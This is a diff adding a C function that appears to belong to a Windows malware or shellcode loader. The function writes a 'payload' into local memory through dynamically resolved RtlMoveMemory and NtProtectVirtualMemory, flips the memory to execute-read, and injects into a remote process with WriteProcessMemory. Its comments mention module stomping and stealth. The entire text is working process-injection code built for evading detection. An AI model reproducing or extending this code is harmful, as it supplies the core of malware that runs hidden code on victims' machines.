@@ -1,0 +1,49 @@
+void WritePayload(HANDLE hTargetProcess, void* pBaseAddress, const unsigned char* payload, SIZE_T payload_len) {
+    if (hTargetProcess == (HANDLE)-1) {
+        // Local Write
+        if (pfnRtlMoveMemory) {
+            DEBUG_PRINT("WritePayload: Copying payload to local memory (RtlMoveMemory)...");
+            
+            // Make sure memory is writable (needed for Module Stomping / Image memory)
+            // We use NtProtectVirtualMemory if available
+            ULONG oldProt = 0;
+            PVOID protAddr = pBaseAddress;
+            SIZE_T protSize = payload_len;
+            
+            if (pfnNtProtectVirtualMemory) {
+                 pfnNtProtectVirtualMemory(GetCurrentProcess(), &protAddr, &protSize, PAGE_READWRITE, &oldProt);
+            }
+            
+            pfnRtlMoveMemory(pBaseAddress, payload, payload_len);
+            
+            // Restore protection (or set to RX)?
+            // Allocator usually returns RX or RWX. 
+            // If Stomping, we want RX. If VirtualAlloc, we want RX.
+            // Let's set to PAGE_EXECUTE_READ to be safe/stealthy?
+            // But if it was RWX (VirtualAlloc), RX is better.
+            if (pfnNtProtectVirtualMemory) {
+                 // Reset protAddr/Size as they might have been modified
+                 protAddr = pBaseAddress; 
+                 protSize = payload_len;
+                 pfnNtProtectVirtualMemory(GetCurrentProcess(), &protAddr, &protSize, PAGE_EXECUTE_READ, &oldProt);
+            }
+            
+        } else {
+            DEBUG_PRINT("WritePayload: pfnRtlMoveMemory is NULL!");
+        }
+    } else {
+        #ifdef pfnWriteProcessMemory_DEFINED
+        if (pfnWriteProcessMemory) {
+            DEBUG_PRINT("WritePayload: Writing payload to remote process (WriteProcessMemory)...");
+            SIZE_T bytesWritten = 0;
+            if (!pfnWriteProcessMemory(hTargetProcess, pBaseAddress, payload, payload_len, &bytesWritten)) {
+                DEBUG_PRINT("WritePayload: WriteProcessMemory failed! Error: %d", pfnGetLastError());
+            }
+        }
+        #else
+        if (pfnWriteProcessMemory) {
+             pfnWriteProcessMemory(hTargetProcess, pBaseAddress, payload, payload_len, NULL);
+        }
+        #endif
+    }
+}
